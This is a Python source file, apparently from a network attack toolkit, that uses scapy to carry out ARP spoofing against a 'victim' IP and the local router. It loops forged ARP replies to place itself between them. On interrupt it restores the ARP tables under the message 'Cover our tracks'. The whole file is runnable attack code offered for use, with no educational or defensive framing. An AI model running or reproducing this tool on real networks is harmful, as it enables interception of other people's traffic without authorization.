import scapy.all as scapy

from colorama import Fore
from modules.net_scan import arp_scan
from time import sleep
from subprocess import call 
from modules.interface_settings import check_default_ip_route


def ip_check(ip):
        checking_IP = ip.split('.')
        if len(checking_IP) != 4 or not all(ip.isnumeric() for ip in checking_IP) or not all(0 <= int(ip) < 255 for ip in checking_IP):
            print(Fore.LIGHTYELLOW_EX + '\n[INFO] Invalid IP address' + Fore.RESET)
            return False
        else: return True


def spoof(target_ip, spoof_ip=check_default_ip_route()):
    try:
        if not ip_check(target_ip): return
        
        if not spoof_ip:    
            spoof_ip = input(Fore.LIGHTYELLOW_EX + '\n[INFO] Failed to detect router`s IP. Enter manually: ' + Fore.RESET)
            if not ip_check(spoof_ip): 
                print(Fore.LIGHTYELLOW_EX + '[INFO] Incorrect interface' + Fore.RESET)
                return

        error, sent_packets, unsent_packets = 2, 0, 0
    
        try:
            call('clear')
            print(Fore.LIGHTYELLOW_EX + '\n[INFO] Packet transmission is starting\r' + Fore.RESET, end='')
            sleep(1)
            
            while True:
                sleep(0.5)
                spoof_mac = arp_scan(spoof_ip)
                target_mac = arp_scan(target_ip)
                if target_mac and spoof_mac:
                    packet_S = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac['mac'], psrc=spoof_ip)
                    packet_R = scapy.ARP(op=2, pdst=spoof_ip, hwdst=spoof_mac['mac'], psrc=target_ip)
                        
                    scapy.send(packet_S, verbose=False)
                    scapy.send(packet_R, verbose=False)
        
                    sent_packets += 1
                    unsent_packets, error = 0, 2
                    print(' '*70, end='')
                    print(Fore.GREEN + f'\r[INFO] Packets sent: {sent_packets}\r' + Fore.RESET, end='')
        
                
                elif unsent_packets == 10:
                    unsent_packets = 0
                    error -= 1
                    print(Fore.LIGHTYELLOW_EX + f'\r[INFO] Packet transmission errors occurred. Packets sent: {sent_packets}\r' + Fore.RESET, end='')
        
                    if not error:
                        print('\r', ' '*70, end='')
                        if sent_packets:
                            print(Fore.RED + f'\r[INFO] IP {target_ip} is no longer on the network\r' + Fore.RESET)
                        else:
                            print(Fore.RED + f'\r[INFO] IP adress {target_ip} not found' + Fore.RESET)
                            return
                        break
                
            
                else: unsent_packets += 1
        except KeyboardInterrupt:
            if sent_packets:
                attempts = 10
                print(' '*80,end='')
                print(Fore.LIGHTYELLOW_EX + '\r[INFO] Cover our tracks\r' + Fore.RESET, end='')
                while attempts:
                    sleep(0.2)
                    spoof_mac = arp_scan(spoof_ip)
                    target_mac = arp_scan(target_ip)
                    if target_mac and spoof_mac:
                        packet_S = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac['mac'], psrc=spoof_ip, hwsrc=spoof_mac['mac'])
                        packet_R = scapy.ARP(op=2, pdst=spoof_ip, hwdst=spoof_mac['mac'], psrc=target_ip, hwsrc=target_mac['mac'])
                                
                        scapy.send(packet_S, verbose=False)
                        scapy.send(packet_R, verbose=False)
                        print(' '*40, end='')
                        print(Fore.GREEN + f'\r[INFO] Network restored ({target_ip})' + Fore.RESET)
                        return
                    else:
                        attempts -= 1
                print(' '*80, end='')
                print(Fore.LIGHTYELLOW_EX + '\r[INFO] Network restoration failed. User disconnected' + Fore.RESET)
      
    except:
        print('\r', ' '*70, end='')
        print(Fore.RED + f'\r[Error] {type(Exception).__name__}' + Fore.RESET)






        
if __name__ == '__main__':
    spoof(input('Enter the victim`s IP: '))
    

